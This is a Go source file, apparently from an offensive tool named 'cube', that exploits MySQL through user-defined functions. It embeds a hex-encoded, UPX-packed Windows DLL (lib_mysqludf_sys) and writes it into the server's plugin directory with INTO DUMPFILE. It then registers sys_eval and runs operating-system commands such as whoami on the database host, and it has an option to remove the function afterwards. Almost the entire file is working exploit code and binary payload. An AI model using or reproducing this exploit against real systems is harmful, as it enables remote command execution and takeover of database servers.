package sqlcmd

import (
	"cube/log"
	"cube/model"
	"database/sql"
	"fmt"
	_ "github.com/go-sql-driver/mysql"
	"strings"
)

func Mysql(task model.SqlcmdTask) (result model.SqlcmdTaskResult) {
	result = model.SqlcmdTaskResult{SqlcmdTask: task, Result: "", Err: nil}
	dataSourceName := fmt.Sprintf("%v:%v@tcp(%v:%v)/mysql?charset=utf8&timeout=%v&multiStatements=true", task.User, task.Password, task.Ip, task.Port, model.ConnectTimeout)

	db, err := sql.Open("mysql", dataSourceName)
	if err != nil {
		return
	}
	fmt.Println()
	if task.Query == "clear" {
		if checkUDF(db) {
			clear(db)
			fmt.Println("[*] drop sys_eval function Successful")
		} else {
			fmt.Println("[*] function sys_eval doesn't exist")
		}

		return
	}

	if checkUDF(db) {
		exec(db, task.Query)
	} else {
		pluginDir := queryPluginDir(db)
		createUDF(db, strings.Replace(pluginDir+"udftest.dll", "\\", "\\\\", -1))
		exec(db, "whoami")
	}

	return result
}

func queryPluginDir(db *sql.DB) string {
	sqlText := "select @@plugin_dir"
	stmt, err := db.Prepare(sqlText)
	if err != nil {
		log.Error(err)
	}
	var pluginDir string

	err = stmt.QueryRow().Scan(&pluginDir)
	if err != nil && err != sql.ErrNoRows {
		log.Error(err)
	}
	return pluginDir
}

func createUDF(db *sql.DB, pluginDir string) {
	sqlText := fmt.Sprintf("set @my_udf_a=concat('',0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000e80000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000677cbfda231dd189231dd189231dd18904dbbf89211dd18904dbbc892a1dd18904dbaa89261dd189231dd0890f1dd18904dbac89211dd18904dba089221dd18904dbab89221dd18904dba989221dd18952696368231dd189000000000000000000000000000000005045000064860300a727a15a0000000000000000f00022200b020800002000000010000000800000109f000000900000000000100000000000100000000200000400000000000000050002000000000000c000000010000000000000020000000000100000000000001000000000000000001000000000000010000000000000000000001000000098b2000008020000b0b10000e800000000b00000b00100000050000050010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000800000001000000000000000040000000000000000000000000000800000e0555058310000000000200000009000000012000000040000000000000000000000000000400000e02e727372630000000010000000b000000006000000160000000000000000000000000000400000c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332e393100555058210d240209e1e421439d3bdfb7de7400000f0f0000002a0000490000d41de9feff833a007450488b05a421000049890009a24008cd4973d20a9f109c1899cd9f34272096280fb70593666d83fdb7410b30b001c332c0c3cc00c215cc92c9ba810034716a6febcc16e46c096a471853fdbf1fa4631c0fb605591688401e41c7011e00ffed6dd62b8b63bf01750f3f42088338007506c64b26ebdc01017b4e2d632b05b9e4b228ce25227ed20cd26f1f28152ab001c3f66d7bc2bf83ec38344a43895c243084b7fff6dbd90b09ff15c71f2b4885c04c8bd87512104c24df6eaeb9608707202dc4388e897c242873edcdfd33c048c7c1ff0033fbf2ae1c120976d9b75b1af7d122e901890b2dcc00be6feb166f28e3026e404848deda7fdb29f938d87459488d0d40ee4e0e813832983de4c1eb81403281480a9ee4435e4f81503281543281563261f37d4fb0018c48804028c34c49467607744e61deed584917e49260680a703c6527cd18782056c740045cf8bf33b64342188b48048b008d4c010239bd1e77d27d8bd947107543706d8045ec1be936130309884370900a00b69dee10c8980a18bc0cb3c6b00e07103fbcb37ddb0f49a585c974066f5d17b7086d21cf93cf047424ada3b9772d7110448b6949e2fa02c2eddfba52e2ce0212498d5c3001e83f0ffce85cd7fddd5febcb418b03c60430d2470d5734b70c58d7e22d0822d34313167bb75bce2618007ca01cff56677c84842f7198f4cf16c64373870d087c8c03d6e4240f79561e541e511e7292939c4e1e4b1e481e63c2425e3e1e1fcf2784ee87c71f1da0981f4c89c68685ee44241824580f6c59897486bb86db76381764bdb900d34c18284cb0db7e302d4d8bf146e8e7b901ee9b6dc1ec04e00dda4533ed4488670beef69b4ff04c39290f8413050673f215fdcfb8b9169125ac1c088be8747b418d5508e1c9b6b13ac0e6cc177c7466a04b6640fa50669047fc3f42858e1b0b9529328d7936ce6f7d61c16c304375cd8cc74803c8f56636b724d470143e51c5ba08e1d9b68d39cc1ceb13225975ad886cdbb6f050eb258bc77004cd1930ddfe9cdb803e30e2154874229245ffb176d8827811fef5887edd4d174ebe5a0eebc18424805ec606e71ada0001380c4c38f12a10f8386c04c6f0a0581a87e792317fd3dc5cd8d6d09d58747a28f2023f73b773df3e448d48406e41b80010b3748bd1f10df7c7ed33c9ab441a5356104cefa2dbe6b66c02c8d8154e1b8d54b94c350aede98d054a75890ba3b16e3b2dbc3133d2c7d0208925183bdf19b7b3bad2c80df2199d30ac581e29eb081433c0922fb384f13be0064ceb0033c029001bb0dfb65538ec024510ff10c9196600fb6f7f6c900390483b0d89293f751148c1c11066f7dddd6fdfb87502f3dac1c910e9150aeccc405361203b8b7d1b5801a05fdcd25b0bfbeef7f685dbc905112fd005020675098d430185bb76efb6205b42c703d59b0d3c48b406634136670b1c5805b12006615bd85bc3cf55d27f6cc7c7c376fc608468e140dcfbf1c2c63831e83be141bdd20f8503ee46bb7408075ee428073c0f8e0d8de6b61b6e2bc58ed3105fdcfd3e76fb0fb12d602e0a741ef290b9e803c91d19bfdb36931d4275e841320783f802740fb9ef6dc3b31fb70eca0208e2ed0d2f2e338e740fd2111912f874491412fc18dadc0b1fd958f847df72165f1803b6bb2d701e4ad0c9eb081573ed12ecf6bedbcf2774192d06429bd72d0698fbfb66d833db891db80e871db906716fc7feb59806e5413bd5dde26541042530bb7dbbbd002c0978081e8bf3f048b93d883072b0b7920a63c7741ad64618d7d29b2f1c6b75e3eb037bf5a79a5ed6390c950cdaeb3fea1f9f7db7f08e8f080644892d312d1bc485c0678fed62771a15e5de0dd6181abe7fddbbeec7050725024585f67507b404bb833d14ddc96e73068b212a0b2d5c6f11dedd264fe3029cf12c66012d3a273e9e9ebe10c58f38d240e468ec98717a60dce91748c3b14d22190f6c20483a5adbf308505851f0dd05bbee77df3d041f208915d12695d275133915d709ed7f38c3750b5a17c61e83fa017405040add6be00275338931d39d08a3b71b0d34c84e20c574134ac68b07863db9d7a64bfc1616e0c9016b3c1a0edc83ffb092ebda1535ab311bc11bdb5b0bd80c430c1dc817084d7bf787755c0b1841ffd385ff88ff03753970f79d75094a08aeeb8d1ca51e36ec648b171028adeb06d8192ecc298adc25f3008bc3659e8793708b218b8bf8b59d9e2a4055bf15eaa3894d7afab61b01018b080724b0d67d5d902dd9c2302f5e7d0ab1485825ff4ddb960c1e92387d2eda02f101d7136fa3f875056c0cfcfa7d918844a4fd258b036983eb2f9e8e090cefc6f852a1899e2681ec880068cd760dbffe73153f156705b8c648f25845b7390cb8283d1f2c586170c339def61624eb754148b73dc6364238004044230430090e662fcf40280578254703055c73874c1c51494e7d4bb1077f4bf0eb222b8093447bdd837d738d0e83c00812d13e8d67db7b642a059b240d20902f9c5ba25b701c2a7214097bc009cc3e1e666c926724766e833572dbff0b70dc7a142f482c38b0bb2493827b8ef083d2396a14019b15650ccb36dc9255b624c80a271b83d76c1854ba6a234e336b1784f781c4aca041592947a626231c0fd8cf53188186d9ef0d68295a4a148a8ef8ececcdd64427cb1366eb75b908674b32d21dea902d3a1c1128106464200a8b83af334463971bcb36e418c323db83a238243d05f62809993959b611402bdc678c90c136de1bc3017f37320296247f15f4f6120d6276d81bc00383e8013c2075643f289c8d3d53041a787f4b8d1d4c068d13a08491790ec372b3326129a9ef4f137f2344720cc96681394d5a75fcb7c3ff174863513c813c0a5045e1137c0a180b020f94c063e343029f4c63413cfec9b4ebed8d7ed24c03c1413c4014450458064525ffc25f6a4ab10018741f8b510b3bd2720a8b4108ed6ff8db03c209d072104183c113c128453bcb72e16fc796b05d1cc1c3cf4cc1267af7446992e1da85dcbd1f4c2bc15feafb5abed0140ccd0f3a24c1e81f600d2cfef7d083e001eb02584fd644ab360196ebcac0b66c3008eec18b01a7ffaa128d3cc77627252205cc11ce78dca606cb113f75463da70ff0dd4603241b471eb801000000277c29847f3fe520000081bff83c3dfc32a2df2d992b7dc7f83074149d6fa3d00e7f5dc6268b2dc285586b212430bc6286b6489934e10ab9b4c856e04671d849460bb50e731c0eb110d9be10a8d813fe6a4cb84c33dbceb8ff00856037ba1623e9b8338975dde016b1df744d44d89c1d39b705dbdd8449f7d3093720d2fbdc4b4646463605dee0e2e4b24746465e505a11000055c9a8aa298064547fb017d8069017303007d04e6f206172ffffdffe67756d656e7473096c6c6f77656420287564663a206c69625f6d79730bf6b7dd716c0d5f73085f696e666f29411c80edff232076657273696f6e20302e0134ededee17a178706563744b657861076c79201a6dbb7dfb652073747243672074791b2070766175d8299b6d21724f2f7477996d60010b1f438ef6f603fb72206e616d4c436f756c246e6f74cce8b66d3b63611320186d27796372ff850740310106023532023001240d0024f6ffb7ffd407001fc408001a740b15640c0010540b000b340a0004822776bbdcfe1918090018c40f13740e640b093427b763d4ed046217d41e5e3f1903241aedbacf2c5007390f2a07801abbdc6e8367165b16743711640c340b7bd85b770442130c390c01118350118b9b6df705530133871c03e4001d5d90ed60430e057b743f09baeeb0d80401072f67079403a06077dbc10701462f462b1074092f0db6d94e3416033b01000715bb0bb6bd971574062f64f7df21000884ddb640ae043439741f00bf20eeecedb6140629034c341f0ba903e1c2debe240f05c305340a13234bd36d9b6e23431e14c45f0f470a75b713760554094b01098909a2071e7de572bb1f1e742f12640d34870142b71582bb2e1311cf0c03ca96dd0e01380f387427005124a3aafec10246ddcd5d20d266d4ff555516c900178fa02a1b003011764bd56c039180bfa007e0126dd79ddd03703407f803680b0013026a76fbba8603540b14021814170b581590fb2f07d9eeecf60a150310340727030034075bd5b9dd7003e0336f0724b3cc755dd7750b30074203ac0b9007f5b61b94db03c03233920c1903c8ba05a0eb0b10074f8be80b508375afeb077303444707990ba0b65dd77507e503280bf0073a1c033c0038b7eb0b5007f71ca70b77b63bdb8b191d2f2007381dcb40071dac7b5d83036c8307d30b601e9ded5eb3039b7c5f07c11e3be0d0ae3bdb07031f3b1007d6039c33ca1255954a005525a3aaa8aa9251645455c9d09ba0887c0402c4ff16360157616974466f7253ac7f2b40fc6c654f626abd14566972747561f63703c46c419a0d536574456e76126dbf01e26f6ee45661726961622b41eb2e40bc18437265b8546806640df65bf76d47264375727222502a636573734914e283cd1226135469636bb6fd6e03026e6b517565727950036684dedbb1f66d616e3716657218446973676fdbdbcf374c6962727879436192731a52746c633bb76d0970a2722d2c7874124cbdb5adfd6f6f6b7570463ec26916b2747279dfb5078b17cd556e77e47e4973446562736f6bed75676763a7a56583e11dfeb6b77268616e64457883704046696ca56c85c58719f19319dab61254176d65151153daf6586b39352b537973176dfa81e87517454173426509a3dbfe434388a0895f616d73675fcc6990b3850bbf5f5f435f73708b6966285f7e267cdb766f5f64116f035f706f6922430b76db2663da5f64ce280009626b31142d325f7a13c417840b5f7b50705b6c735f330a6c212205db5accd82a58096e73ed6bc982130fd76d643ed6bad6de756c343f15416d170cdea3e0020ab52689a3b565c933a196063bc16db15b0772652508661115080d5ba1739c29709f73149bb5adb93932ae6e074d0f85d7badbc56f736a663a70105e3b84ed70705831747b6d343fdf15f4c700f08c21180800e264860600a76efb0fe327a15ae6f00022200b020808120cb07744b314132e0010000005cf1e6c9b02020433050002088000c302f663146d160100022e063af76c650f0a50394330908de8db88223c1460e2d880d4bd0118020183703aacbb024b00303a011e4644a42b2e1054822d3bd810901200dc00b3dbc63b6f602e7264a76108550b53597761dd000c03162740022e26291b61f600d805100c22273616ececc02e702850eb27244fd820fc007273726300136027b3c7013226650942fca664b0702728421b4036c08d6d05ca7212d3060000000000009000ff0048894c240848895424104c8944241880fa010f854502000053565755488d35cdf0ffff488dbe0080ffff5731db31c94883cdffe85000000001db7402f3c38b1e4883eefc11db8a16f3c3488d042f83f9058a1076214883fdfc771b83e9048b104883c00483e9048917488d7f0473ef83c1048a10741048ffc0881783e9018a10488d7f0175f0f3c3fc415beb0848ffc6881748ffc78a1601db750a8b1e4883eefc11db8a1672e68d410141ffd311c001db750a8b1e4883eefc11db8a1673eb83e8037217c1e0080fb6d209d048ffc683f0ff0f843a0000004863e88d410141ffd311c941ffd311c9751889c183c00241ffd311c901db75088b1e4883eefc11db73ed4881fd00f3ffff11c1e83affffffeb835e4889f7b900120000b2004889fbeb2c8a074883c7013c80720a3c8f7706807ffe0f74062ce83c0177233817751f8b072500ffffff0fc829f801d8ab4883e9048a074883c70148ffc975d9eb0548ffc975be4883ec28488dbe007000008b0709c0744f8b5f04488d8c30b0a100004801f34883c708ff96eca1000048958a0748ffc708c074d74889f94889faffc8f2ae4889e9ff96f4a100004809c074094889034883c308ebd64883c4285d5f5e5b31c0c34883c4284883c704488d5efc31c08a0748ffc709c074233cef77114801c3488b03480fc84801f0488903ebe0240fc1e010668b074883c702ebe1488baefca10000488dbe00f0ffffbb00100000504989e141b8040000004889da4889f94883ec20ffd5488d871702000080207f8060287f4c8d4c24204d8b014889da4889f9ffd54883c4285d5f5e5b488d4424806a004839c475f94883ec804c8b442418488b542410488b4c2408e91f79ffff000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010002000000300000800000000000000000040000000000010009040000480000005cb0000054010000e404000000000000586000003c617373656d626c7920786d6c6e733d2275726e3a736368656d61732d6d6963726f736f66742d636f6d3a61736d2e763122206d616e696665737456657273696f6e3d22312e30223e0d0a20203c646570656e64656e63793e0d0a202020203c646570656e64656e74417373656d626c793e0d0a2020202020203c617373656d626c794964656e7469747920747970653d2277696e333222206e616d653d224d6963726f736f66742e564338302e435254222076657273696f6e3d22382e302e35303630382e30222070726f636573736f724172636869746563747572653d22616d64363422207075626c69634b6579546f6b656e3d2231666338623362396131653138653362223e3c2f617373656d626c794964656e746974793e0d0a202020203c2f646570656e64656e74417373656d626c793e0d0a20203c2f646570656e64656e63793e0d0a3c2f617373656d626c793e0000000000000000000000002cb20000ecb1000000000000000000000000000039b200001cb20000000000000000000000000000000000000000000044b200000000000052b200000000000062b200000000000072b200000000000080b200000000000000000000000000008eb200000000000000000000000000004b45524e454c33322e444c4c004d5356435238302e646c6c00004c6f61644c69627261727941000047657450726f634164647265737300005669727475616c50726f7465637400005669727475616c416c6c6f6300005669727475616c46726565000000667265650000000000000000a727a15a0000000074b30000010000001200000012000000c0b2000008b3000050b300007010000060100000001000008015000060100000701500002014000060100000901300000014000060100000901300003011000060100000c010000000130000e0120000a011000089b300009fb30000bcb30000d7b30000e3b30000f6b3000007b4000010b4000020b400002eb4000037b4000047b4000055b400005db400006cb4000079b4000081b4000090b4000000000100020003000400050006000700080009000a000b000c000d000e000f00100011006c69625f6d7973716c7564665f7379732e646c6c006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f62696e6576616c007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f6576616c007379735f6576616c5f6465696e6974007379735f6576616c5f696e6974007379735f65786563007379735f657865635f6465696e6974007379735f657865635f696e6974007379735f676574007379735f6765745f6465696e6974007379735f6765745f696e6974007379735f736574007379735f7365745f6465696e6974007379735f7365745f696e69740000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000);"+
		"drop table if exists my_udf_data;"+
		"create table my_udf_data(data LONGBLOB);"+
		"insert into my_udf_data values('');"+
		"update my_udf_data set data = @my_udf_a;"+
		"select data from my_udf_data into DUMPFILE '%s';"+
		"create function sys_eval returns string soname 'udftest.dll';select sys_eval('whoami');", pluginDir)
	rows, err := db.Query(sqlText)
	if err != nil {
		log.Errorf("Err in create UDF: %s", err)
	}

	cols, _ := rows.Columns()
	for rows.Next() {
		err := rows.Scan(&cols[0])
		if err != nil {
			log.Error(err)
		}
		fmt.Println(cols[0])
	}

}

func exec(db *sql.DB, cmd string) {
	sql := fmt.Sprintf("select sys_eval('%s')", cmd)
	rows, err := db.Query(sql)
	if err != nil {
		fmt.Println(err)
	}

	cols, _ := rows.Columns()
	for rows.Next() {
		err := rows.Scan(&cols[0])
		if err != nil {
			fmt.Println(err)
		}
		fmt.Println(cols[0])
	}
}

func checkUDF(db *sql.DB) (b bool) {
	querySql := fmt.Sprintf("select sys_eval('')")
	rows, err := db.Query(querySql)
	if err != nil {
		fmt.Println(err)
	}
	var s sql.NullString
	//_, _ = rows.Columns()
	for rows.Next() {
		err := rows.Scan(&s)
		if err != nil {
			fmt.Println(err)
			b = false
		} else {
			b = true
		}
	}
	return b
}

func clear(db *sql.DB) {
	querySql := fmt.Sprintf("drop function if exists sys_eval")
	_, err := db.Query(querySql)
	if err != nil {
		fmt.Println(err)
	}

}
